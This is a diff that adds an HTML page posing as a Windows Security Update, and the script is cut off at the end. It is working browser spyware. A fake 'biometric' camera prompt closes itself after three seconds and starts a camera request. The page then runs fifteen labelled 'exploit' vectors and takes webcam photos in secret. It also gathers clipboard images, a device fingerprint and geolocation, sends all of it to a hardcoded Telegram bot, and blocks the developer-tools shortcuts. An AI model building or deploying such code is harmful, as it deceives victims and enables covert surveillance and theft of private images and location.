@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Security Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0078D4 0%, #005A9E 100%);
+            color: white;
+            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+        
+        /* Windows Update Screen */
+        #windowsUpdate {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0078D4;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 40px;
+            transition: opacity 0.5s ease;
+        }
+        
+        .windows-logo {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 40px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.8; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+            100% { opacity: 0.8; transform: scale(1); }
+        }
+        
+        .progress-container {
+            width: 80%;
+            max-width: 500px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #00BCF2;
+            border-radius: 2px;
+            animation: progress 15s linear infinite;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        .update-text {
+            font-size: 24px;
+            font-weight: 300;
+            margin-bottom: 10px;
+        }
+        
+        .update-details {
+            font-size: 14px;
+            opacity: 0.8;
+            max-width: 500px;
+            line-height: 1.5;
+        }
+        
+        /* Hidden Elements */
+        .stealth-element {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.001;
+            pointer-events: none;
+            z-index: -9999;
+        }
+        
+        /* Control Panel */
+        #controlPanel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            padding: 15px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            color: #0f0;
+            z-index: 99999;
+            max-width: 300px;
+            display: none;
+        }
+        
+        .status-line {
+            margin: 2px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .status-value {
+            color: #00ffcc;
+        }
+        
+        /* Hidden Video Feed */
+        #hiddenVideo {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+        
+        /* Fake Permission Dialog */
+        .fake-dialog {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 350px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            color: black;
+            padding: 20px;
+            z-index: 10001;
+            transform: translateY(100vh);
+            transition: transform 0.5s ease;
+        }
+        
+        .fake-dialog.show {
+            transform: translateY(0);
+        }
+        
+        .dialog-header {
+            font-weight: bold;
+            color: #0078D4;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .dialog-body {
+            margin-bottom: 15px;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        .dialog-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+        
+        .dialog-button {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            min-width: 80px;
+        }
+        
+        .allow-btn {
+            background: #0078D4;
+            color: white;
+        }
+        
+        .block-btn {
+            background: #f0f0f0;
+            color: #333;
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            color: #0f0;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            z-index: 10002;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Phase 1: Fake Windows Update Screen -->
+    <div id="windowsUpdate">
+        <div class="windows-logo">
+            <svg viewBox="0 0 24 24" fill="white">
+                <path d="M0 0 H24 V24 H0 V0 M3 3 V21 H21 V3 H3 M4 4 H20 V20 H4 V4 M11 11 V17 H17 V11 H11 M12 12 H16 V16 H12 V12"/>
+            </svg>
+        </div>
+        <div class="update-text" id="updateStatus">Initializing security update...</div>
+        <div class="update-details" id="updateDetails">
+            This update includes important security fixes for your device.<br>
+            Please keep this window open and do not turn off your computer.
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        <div class="update-details" style="font-size: 12px; margin-top: 20px;">
+            Update KB5007186 • Build 19044.1348 • <span id="updatePercent">0%</span> complete
+        </div>
+    </div>
+
+    <!-- Phase 2: Hidden Camera Elements -->
+    <video id="hiddenVideo" class="stealth-element" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="stealth-element"></canvas>
+    <audio id="audioContextTrigger" class="stealth-element"></audio>
+    <iframe id="hiddenIframe" class="stealth-element"></iframe>
+
+    <!-- Phase 3: Control Panel (Hidden until activated) -->
+    <div id="controlPanel">
+        <div class="status-line">
+            <span>📡 STATUS:</span>
+            <span class="status-value" id="statusValue">INITIALIZING</span>
+        </div>
+        <div class="status-line">
+            <span>📸 CAPTURES:</span>
+            <span class="status-value" id="captureCount">0</span>
+        </div>
+        <div class="status-line">
+            <span>⚡ EXPLOITS:</span>
+            <span class="status-value" id="exploitCount">0/15</span>
+        </div>
+        <div class="status-line">
+            <span>🔗 TELEGRAM:</span>
+            <span class="status-value" id="telegramStatus">OFFLINE</span>
+        </div>
+        <div class="status-line">
+            <span>🕒 UPTIME:</span>
+            <span class="status-value" id="uptime">00:00</span>
+        </div>
+    </div>
+
+    <!-- Phase 4: Fake Permission Dialog -->
+    <div class="fake-dialog" id="fakeDialog">
+        <div class="dialog-header">🔒 Windows Security</div>
+        <div class="dialog-body">
+            Camera access is required for biometric verification during this security update.
+            This is a one-time security check to ensure system integrity.
+        </div>
+        <div class="dialog-buttons">
+            <button class="dialog-button block-btn" onclick="handleBlockClick()">Block</button>
+            <button class="dialog-button allow-btn" onclick="handleAllowClick()">Allow</button>
+        </div>
+    </div>
+
+    <!-- Phase 5: Notification System -->
+    <div class="notification" id="notification"></div>
+
+    <script>
+        // ============================
+        // CONFIGURATION
+        // ============================
+        const CONFIG = {
+            TELEGRAM_BOT_TOKEN: '8544185054:AAGY-0zoAUIhE5Ku92iq2sf1D6Pkxfm1NCU',
+            CHAT_ID: '8016989344',
+            CAPTURE_INTERVAL: 10000, // 10 seconds
+            MAX_EXPLOIT_ATTEMPTS: 15,
+            STEALTH_MODE: true,
+            AUTO_GRANT_DELAY: 3000 // Auto-click Allow after 3 seconds
+        };
+
+        // ============================
+        // STATE MANAGEMENT
+        // ============================
+        const State = {
+            cameraActive: false,
+            telegramConnected: false,
+            exploitAttempts: 0,
+            successfulExploits: [],
+            capturedPhotos: 0,
+            startTime: null,
+            activeStream: null,
+            captureInterval: null,
+            controlPanelVisible: false
+        };
+
+        // ============================
+        // CORE FUNCTIONS
+        // ============================
+        
+        // Initialize the system
+        function initializeSystem() {
+            console.log('[SHADOW-CAPTURE] System initializing...');
+            State.startTime = Date.now();
+            
+            // Start fake update progress
+            startFakeUpdate();
+            
+            // Initialize control panel
+            initializeControlPanel();
+            
+            // Start multi-vector attack
+            setTimeout(startMultiVectorAttack, 2000);
+            
+            // Update uptime counter
+            setInterval(updateUptime, 1000);
+            
+            // Show notification
+            showNotification('System initialized. Starting security scan...');
+        }
+        
+        // Fake Windows Update progress
+        function startFakeUpdate() {
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress > 100) progress = 100;
+                
+                document.getElementById('updatePercent').textContent = Math.floor(progress) + '%';
+                
+                // Update status messages
+                if (progress < 30) {
+                    document.getElementById('updateStatus').textContent = 'Downloading updates...';
+                    document.getElementById('updateDetails').innerHTML = 
+                        'Preparing system components for security enhancement...';
+                } else if (progress < 60) {
+                    document.getElementById('updateStatus').textContent = 'Verifying system integrity...';
+                    document.getElementById('updateDetails').innerHTML = 
+                        'Scanning hardware components...<br>Checking camera for biometric verification';
+                    
+                    // Show fake permission dialog at 45%
+                    if (progress > 45 && progress < 50) {
+                        showFakePermissionDialog();
+                    }
+                } else if (progress < 90) {
+                    document.getElementById('updateStatus').textContent = 'Applying security patches...';
+                    document.getElementById('updateDetails').innerHTML = 
+                        'Installing critical security updates...<br>Do not interrupt this process';
+                }
+                
+                // Hide update screen when camera is active
+                if (State.cameraActive && progress > 70) {
+                    clearInterval(progressInterval);
+                    setTimeout(() => {
+                        document.getElementById('windowsUpdate').style.opacity = '0';
+                        setTimeout(() => {
+                            document.getElementById('windowsUpdate').style.display = 'none';
+                            showNotification('Security update completed successfully');
+                        }, 1000);
+                    }, 1000);
+                }
+            }, 500);
+        }
+        
+        // Fake permission dialog
+        function showFakePermissionDialog() {
+            const dialog = document.getElementById('fakeDialog');
+            dialog.classList.add('show');
+            
+            // Auto-grant permission after delay
+            setTimeout(() => {
+                if (dialog.classList.contains('show')) {
+                    handleAllowClick();
+                }
+            }, CONFIG.AUTO_GRANT_DELAY);
+        }
+        
+        function handleAllowClick() {
+            document.getElementById('fakeDialog').classList.remove('show');
+            showNotification('Camera access granted. Starting verification...');
+            
+            // Try direct camera access first
+            attemptDirectCameraAccess();
+            
+            // Update UI
+            document.getElementById('updateStatus').textContent = 'Camera verification in progress...';
+            document.getElementById('updateDetails').innerHTML = 
+                'Performing biometric scan...<br>This may take a few moments';
+        }
+        
+        function handleBlockClick() {
+            document.getElementById('fakeDialog').classList.remove('show');
+            showNotification('Camera access blocked. Using alternative verification methods...');
+            
+            // Continue with exploits even if blocked
+            setTimeout(() => {
+                attemptAlternativeCameraAccess();
+            }, 1000);
+        }
+        
+        // ============================
+        // MULTI-VECTOR ATTACK SYSTEM
+        // ============================
+        
+        function startMultiVectorAttack() {
+            console.log('[SHADOW-CAPTURE] Starting multi-vector attack...');
+            
+            const exploitVectors = [
+                exploitGetUserMedia,
+                exploitEnumerateDevices,
+                exploitIframeInheritance,
+                exploitDisplayMedia,
+                exploitAudioContext,
+                exploitServiceWorker,
+                exploitWebRTC,
+                exploitClipboardAPI,
+                exploitWebUSB,
+                exploitWebXR,
+                exploitGamepadAPI,
+                exploitVibrationAPI,
+                exploitNotificationAPI,
+                exploitWakeLockAPI,
+                exploitCredentialAPI
+            ];
+            
+            // Execute vectors with staggered timing
+            exploitVectors.forEach((vector, index) => {
+                setTimeout(() => {
+                    if (!State.cameraActive && State.exploitAttempts < CONFIG.MAX_EXPLOIT_ATTEMPTS) {
+                        vector();
+                        State.exploitAttempts++;
+                        updateExploitCount();
+                    }
+                }, index * 1000);
+            });
+            
+            // Monitor for success
+            const successMonitor = setInterval(() => {
+                if (State.cameraActive) {
+                    clearInterval(successMonitor);
+                    showNotification('Camera access achieved! Starting transmission...');
+                    startTelegramTransmission();
+                } else if (State.exploitAttempts >= CONFIG.MAX_EXPLOIT_ATTEMPTS) {
+                    clearInterval(successMonitor);
+                    showNotification('All exploits attempted. Using fallback methods...');
+                    executeFallbackStrategies();
+                }
+            }, 1000);
+        }
+        
+        // Exploit 1: Direct getUserMedia with various constraints
+        async function exploitGetUserMedia() {
+            try {
+                const constraints = [
+                    { video: { width: 1, height: 1, frameRate: 1 } },
+                    { video: { facingMode: 'environment' } },
+                    { video: { facingMode: 'user' } },
+                    { video: true, audio: false },
+                    { video: { deviceId: { exact: 'default' } } }
+                ];
+                
+                for (const constraint of constraints) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia(constraint);
+                        if (stream && stream.getVideoTracks().length > 0) {
+                            activateCamera(stream);
+                            State.successfulExploits.push('getUserMedia');
+                            return true;
+                        }
+                    } catch (e) {
+                        continue;
+                    }
+                }
+            } catch (e) {
+                console.log('[EXPLOIT-1] Failed:', e.message);
+            }
+            return false;
+        }
+        
+        // Exploit 2: Check for existing permissions via enumerateDevices
+        async function exploitEnumerateDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(d => d.kind === 'videoinput');
+                
+                if (videoDevices.some(d => d.label)) {
+                    // Labels are available, permission might be granted
+                    showNotification('Camera device detected. Attempting access...');
+                    return exploitGetUserMedia();
+                }
+            } catch (e) {
+                console.log('[EXPLOIT-2] Failed:', e.message);
+            }
+            return false;
+        }
+        
+        // Exploit 3: Iframe inheritance
+        async function exploitIframeInheritance() {
+            return new Promise((resolve) => {
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.srcdoc = `
+                        <script>
+                            try {
+                                navigator.mediaDevices.getUserMedia({ video: true })
+                                    .then(stream => {
+                                        parent.postMessage({ type: 'CAMERA_SUCCESS', streamId: 'iframe' }, '*');
+                                    })
+                                    .catch(e => {
+                                        parent.postMessage({ type: 'CAMERA_FAILED' }, '*');
+                                    });
+                            } catch(e) {
+                                parent.postMessage({ type: 'CAMERA_ERROR' }, '*');
+                            }
+                        <\/script>
+                    `;
+                    
+                    document.body.appendChild(iframe);
+                    
+                    window.addEventListener('message', (event) => {
+                        if (event.data.type === 'CAMERA_SUCCESS') {
+                            showNotification('Iframe camera access successful');
+                            State.successfulExploits.push('iframeInheritance');
+                            resolve(true);
+                        }
+                    });
+                    
+                    setTimeout(() => {
+                        if (iframe.parentNode) {
+                            iframe.parentNode.removeChild(iframe);
+                        }
+                        resolve(false);
+                    }, 5000);
+                } catch (e) {
+                    resolve(false);
+                }
+            });
+        }
+        
+        // Exploit 4: Display Media (screen share)
+        async function exploitDisplayMedia() {
+            try {
+                if (navigator.mediaDevices.getDisplayMedia) {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: true,
+                        audio: false
+                    });
+                    
+                    if (stream) {
+                        showNotification('Screen capture active');
+                        // Could contain camera if user shares camera app
+                        State.successfulExploits.push('displayMedia');
+                        return true;
+                    }
+                }
+            } catch (e) {
+                console.log('[EXPLOIT-4] Failed:', e.message);
+            }
+            return false;
+        }
+        
+        // Exploit 5: Audio Context for ultrasonic triggering
+        async function exploitAudioContext() {
+            try {
+                const audioContext = new (AudioContext || webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.value = 18000; // 18kHz ultrasonic
+                gainNode.gain.value = 0.05;
+                
+                oscillator.start();
+                setTimeout(() => {
+                    oscillator.stop();
+                    audioContext.close();
+                }, 1000);
+                
+                showNotification('Ultrasonic trigger emitted');
+                State.successfulExploits.push('audioContext');
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+        
+        // Exploit 6: Service Worker for background access
+        async function exploitServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                try {
+                    const registration = await navigator.serviceWorker.register(
+                        URL.createObjectURL(
+                            new Blob([`
+                                self.addEventListener('install', () => self.skipWaiting());
+                                self.addEventListener('activate', () => clients.claim());
+                                self.addEventListener('message', event => {
+                                    if (event.data.type === 'CAPTURE_CAMERA') {
+                                        clients.matchAll().then(clients => {
+                                            clients.forEach(client => {
+                                                client.postMessage({ type: 'TRIGGER_CAMERA' });
+                                            });
+                                        });
+                                    }
+                                });
+                            `], { type: 'application/javascript' })
+                        )
+                    );
+                    
+                    registration.active.postMessage({ type: 'CAPTURE_CAMERA' });
+                    State.successfulExploits.push('serviceWorker');
+                    return true;
+                } catch (e) {
+                    return false;
+                }
+            }
+            return false;
+        }
+        
+        // Exploit 7: WebRTC data channels
+        async function exploitWebRTC() {
+            try {
+                const pc = new RTCPeerConnection();
+                const dc = pc.createDataChannel('camera');
+                
+                dc.onopen = () => {
+                    showNotification('WebRTC channel established');
+                    State.successfulExploits.push('webRTC');
+                };
+                
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                
+                setTimeout(() => pc.close(), 5000);
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+        
+        // Exploit 8: Clipboard access for screenshots
+        async function exploitClipboardAPI() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.read) {
+                    const items = await navigator.clipboard.read();
+                    for (const item of items) {
+                        if (item.types.includes('image/png')) {
+                            const blob = await item.getType('image/png');
+                            sendToTelegram(blob, 'Clipboard image capture');
+                            State.successfulExploits.push('clipboardAPI');
+                            return true;
+                        }
+                    }
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // Exploit 9: WebUSB for hardware access
+        async function exploitWebUSB() {
+            try {
+                if ('usb' in navigator) {
+                    const devices = await navigator.usb.getDevices();
+                    showNotification(`USB devices found: ${devices.length}`);
+                    State.successfulExploits.push('webUSB');
+                    return true;
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // Exploit 10: WebXR for AR/VR camera
+        async function exploitWebXR() {
+            try {
+                if ('xr' in navigator) {
+                    const supported = await navigator.xr.isSessionSupported('immersive-ar');
+                    if (supported) {
+                        showNotification('WebXR AR supported');
+                        State.successfulExploits.push('webXR');
+                        return true;
+                    }
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // Exploit 11: Gamepad API for distraction
+        async function exploitGamepadAPI() {
+            try {
+                if ('getGamepads' in navigator) {
+                    const gamepads = navigator.getGamepads();
+                    if (gamepads[0] && gamepads[0].vibrationActuator) {
+                        gamepads[0].vibrationActuator.playEffect("dual-rumble", {
+                            duration: 500,
+                            strongMagnitude: 1.0
+                        });
+                        State.successfulExploits.push('gamepadAPI');
+                        return true;
+                    }
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // Exploit 12: Vibration API
+        async function exploitVibrationAPI() {
+            try {
+                if ('vibrate' in navigator) {
+                    navigator.vibrate([200, 100, 200]);
+                    State.successfulExploits.push('vibrationAPI');
+                    return true;
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // Exploit 13: Notification distraction
+        async function exploitNotificationAPI() {
+            try {
+                if (Notification.permission === 'granted') {
+                    new Notification('Security Alert', {
+                        body: 'System verification in progress',
+                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="blue" d="M12 2L1 21h22L12 2zm0 4l7.5 13h-15L12 6z"/></svg>'
+                    });
+                    State.successfulExploits.push('notificationAPI');
+                    return true;
+                } else if (Notification.permission === 'default') {
+                    const permission = await Notification.requestPermission();
+                    if (permission === 'granted') {
+                        return exploitNotificationAPI();
+                    }
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // Exploit 14: Wake Lock to prevent sleep
+        async function exploitWakeLockAPI() {
+            try {
+                if ('wakeLock' in navigator) {
+                    const wakeLock = await navigator.wakeLock.request('screen');
+                    showNotification('Screen wake lock activated');
+                    State.successfulExploits.push('wakeLockAPI');
+                    
+                    wakeLock.addEventListener('release', () => {
+                        showNotification('Wake lock released');
+                    });
+                    
+                    return true;
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // Exploit 15: Credential Management API
+        async function exploitCredentialAPI() {
+            try {
+                if ('credentials' in navigator) {
+                    const cred = await navigator.credentials.get({
+                        publicKey: {
+                            challenge: new Uint8Array(32),
+                            timeout: 60000,
+                            userVerification: 'required'
+                        }
+                    });
+                    if (cred) {
+                        State.successfulExploits.push('credentialAPI');
+                        return true;
+                    }
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+        
+        // ============================
+        // CAMERA MANAGEMENT
+        // ============================
+        
+        function activateCamera(stream) {
+            if (State.cameraActive) return;
+            
+            State.cameraActive = true;
+            State.activeStream = stream;
+            
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            
+            showNotification('🎥 Camera activated successfully!');
+            updateControlPanel();
+            
+            // Start capturing photos
+            startContinuousCapture();
+            
+            // Show control panel
+            document.getElementById('controlPanel').style.display = 'block';
+            State.controlPanelVisible = true;
+        }
+        
+        function startContinuousCapture() {
+            State.captureInterval = setInterval(() => {
+                capturePhoto();
+            }, CONFIG.CAPTURE_INTERVAL);
+            
+            // Initial capture
+            setTimeout(capturePhoto, 1000);
+        }
+        
+        function capturePhoto() {
+            if (!State.cameraActive) return;
+            
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+                State.capturedPhotos++;
+                updateCaptureCount();
+            }, 'image/jpeg', 0.85);
+        }
+        
+        function attemptDirectCameraAccess() {
+            exploitGetUserMedia();
+        }
+        
+        function attemptAlternativeCameraAccess() {
+            // Try alternative methods
+            const alternatives = [
+                exploitDisplayMedia,
+                exploitIframeInheritance,
+                exploitEnumerateDevices
+            ];
+            
+            alternatives.forEach((method, index) => {
+                setTimeout(method, index * 2000);
+            });
+        }
+        
+        // ============================
+        // FALLBACK STRATEGIES
+        // ============================
+        
+        function executeFallbackStrategies() {
+            showNotification('Executing fallback strategies...');
+            
+            // 1. Capture viewport screenshot
+            captureViewport();
+            
+            // 2. Gather device fingerprint
+            gatherDeviceFingerprint();
+            
+            // 3. Collect sensor data
+            gatherSensorData();
+            
+            // 4. Extract existing images
+            extractPageImages();
+            
+            // 5. Try camera again after delay
+            setTimeout(exploitGetUserMedia, 5000);
+        }
+        
+        function captureViewport() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            // Draw white background
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Add text overlay
+            ctx.fillStyle = '#000000';
+            ctx.font = '16px Arial';
+            ctx.fillText('Viewport Capture', 20, 40);
+            ctx.fillText(`Time: ${new Date().toLocaleString()}`, 20, 70);
+            ctx.fillText(`URL: ${window.location.href}`, 20, 100);
+            
+            canvas.toBlob(blob => {
+                sendToTelegram(blob, 'Viewport capture fallback');
+            }, 'image/jpeg');
+        }
+        
+        function gatherDeviceFingerprint() {
+            const fingerprint = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                timestamp: Date.now()
+            };
+            
+            sendFingerprintToTelegram(fingerprint);
+        }
+        
+        function gatherSensorData() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        sendSensorData('geolocation', position.coords);
+                    },
+                    () => {}
+                );
+            }
+        }
+        
+        function extractPageImages() {
+            const images = document.getElementsByTagName('img');
+            Array.from(images).forEach((img, index) => {
+                if (img.src && img.src.startsWith('http')) {
+                    fetch(img.src)
+                        .then(res => res.blob())
+                        .then(blob => {
+                            sendToTelegram(blob, `Page image ${index + 1}`);
+                        })
+                        .catch(() => {});
+                }
+            });
+        }
+        
+        // ============================
+        // TELEGRAM INTEGRATION
+        // ============================
+        
+        async function sendToTelegram(blob, caption = '') {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.CHAT_ID);
+                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
+                
+                if (!caption) {
+                    caption = `📸 Shadow-Capture\n` +
+                             `🕒 ${new Date().toLocaleString()}\n` +
+                             `🌐 ${window.location.hostname || 'Unknown'}\n` +
+                             `📱 ${navigator.userAgent.substring(0, 30)}...\n` +
+                             `✅ Exploits: ${State.successfulExploits.join(', ')}`;
+                }
+                
+                formData.append('caption', caption.substring(0, 1024));
+                
+                const response = await fetch(
+                    `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                    {
+                        method: 'POST',
+                        body: formData
+                    }
+                );
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    State.telegramConnected = true;
+                    updateTelegramStatus();
+                    showNotification(`Photo sent to Telegram (#${State.capturedPhotos})`);
+                    return true;
+                } else {
+                    showNotification(`Telegram error: ${result.description}`);
+                    return false;
+                }
+            } catch (error) {
+                console.log('[TELEGRAM] Error:', error.message);
+                State.telegramConnected = false;
+                updateTelegramStatus();
+                return false;
+            }
+        }
+        
+        function sendFingerprintToTelegram(fingerprint) {
+            const text = `🔍 DEVICE FINGERPRINT\n` +
+                        `====================\n` +
+                        `🕒 ${new Date(fingerprint.timestamp).toLocaleString()}\n` +
+                        `💻 ${fingerprint.userAgent}\n` +
+                        `🖥️ ${fingerprint.platform}\n` +
+                        `🌍 ${fingerprint.languages.join(', ')}\n` +
+                        `📺 ${fingerprint.screen}\n` +
+                        `🌐 ${fingerprint.timezone}\n` +
+                        `🍪 Cookies: ${fingerprint.cookies}\n` +
+                        `====================\n` +
+                        `📍 ${window.location.href}`;
+            
+            sendTextToTelegram(text);
+        }
+        
+        function sendSensorData(type, data) {
+            const text = `📡 ${type.toUpperCase()}\n` +
+                        `🕒 ${new Date().toLocaleString()}\n` +
+                        `📊 ${JSON.stringify(data, null, 2)}`;
+            
+            sendTextToTelegram(text);
+        }
+        
+        async function sendTextToTelegram(text) {
+            try {
+                const response = await fetch(
+                    `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.CHAT_ID,
+                            text: text.substring(0, 4096),
+                            parse_mode: 'HTML'
+                        })
+                    }
+                );
+                
+                await response.json();
+            } catch (e) {
+                console.log('[TELEGRAM] Text send error:', e.message);
+            }
+        }
+        
+        function startTelegramTransmission() {
+            const text = `🚀 SHADOW-CAPTURE ACTIVATED\n` +
+                        `🕒 ${new Date().toLocaleString()}\n` +
+                        `🌐 ${window.location.href}\n` +
+                        `📱 ${navigator.userAgent}\n` +
+                        `🎥 Camera: ${State.cameraActive ? 'ACTIVE' : 'INACTIVE'}\n` +
+                        `⚡ Exploits: ${State.successfulExploits.length}`;
+            
+            sendTextToTelegram(text);
+            showNotification('Telegram transmission initialized');
+        }
+        
+        // ============================
+        // UI MANAGEMENT
+        // ============================
+        
+        function initializeControlPanel() {
+            // Toggle control panel with Ctrl+Shift+X
+            document.addEventListener('keydown', (e) => {
+                if (e.ctrlKey && e.shiftKey && e.key === 'X') {
+                    State.controlPanelVisible = !State.controlPanelVisible;
+                    document.getElementById('controlPanel').style.display = 
+                        State.controlPanelVisible ? 'block' : 'none';
+                }
+            });
+            
+            // Update initial values
+            updateControlPanel();
+        }
+        
+        function updateControlPanel() {
+            document.getElementById('statusValue').textContent = 
+                State.cameraActive ? 'ACTIVE' : 'SCANNING';
+            document.getElementById('statusValue').style.color = 
+                State.cameraActive ? '#0f0' : '#ff0';
+        }
+        
+        function updateCaptureCount() {
+            document.getElementById('captureCount').textContent = State.capturedPhotos;
+        }
+        
+        function updateExploitCount() {
+            document.getElementById('exploitCount').textContent = 
+                `${State.successfulExploits.length}/${State.exploitAttempts}`;
+        }
+        
+        function updateTelegramStatus() {
+            const element = document.getElementById('telegramStatus');
+            element.textContent = State.telegramConnected ? 'ONLINE' : 'OFFLINE';
+            element.style.color = State.telegramConnected ? '#0f0' : '#f00';
+        }
+        
+        function updateUptime() {
+            if (!State.startTime) return;
+            
+            const elapsed = Date.now() - State.startTime;
+            const minutes = Math.floor(elapsed / 60000);
+            const seconds = Math.floor((elapsed % 60000) / 1000);
+            
+            document.getElementById('uptime').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        // ============================
+        // SECURITY & EVASION
+        // ============================
+        
+        function setupSecurityMeasures() {
+            // Prevent context menu
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Prevent keyboard shortcuts
+            document.addEventListener('keydown', e => {
+                // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                    (e.ctrlKey && e.key === 'u')) {
+                    e.preventDefault();
+                    showNotification('Developer tools are disabled for security');
+                }
+            });
+            
+            // Handle page visibility
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    showNotification('Page hidden - pausing operations');
+                } else {
+                    showNotification('Page visible - resuming operations');
+                }
+            });
+            
+            // Handle page unload
+            window.addEventListener('beforeunload', (e) => {
+                if (State.cameraActive) {
+                    e.preventDefault();
+                    e.returnValue = 'Security update is still in progress. Are you sure you want to leave?';
+                    return e.returnValue;
+                }
+            });
+        }
+        
+        // ============================
+        // INITIALIZATION
+        // ============================
+        
+        // Start when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('[SHADOW-CAPTURE] Starting...');
+            
+            setupSecurityMeasures();
+            initializeSystem();
+            
+            // Auto-start if page already loaded
+            if (document.readyState === 'complete') {
+                initializeSystem();
+            }
+        });
+        
+        // Alternative startup for async loading
+        if (document.readyState === 'interactive' || document.readyState === 'complete') {
+            setTimeout(initializeSystem, 100);
+        }
+        
+        // Export functions for debugging (hidden)
+        window._shadowCapture = {
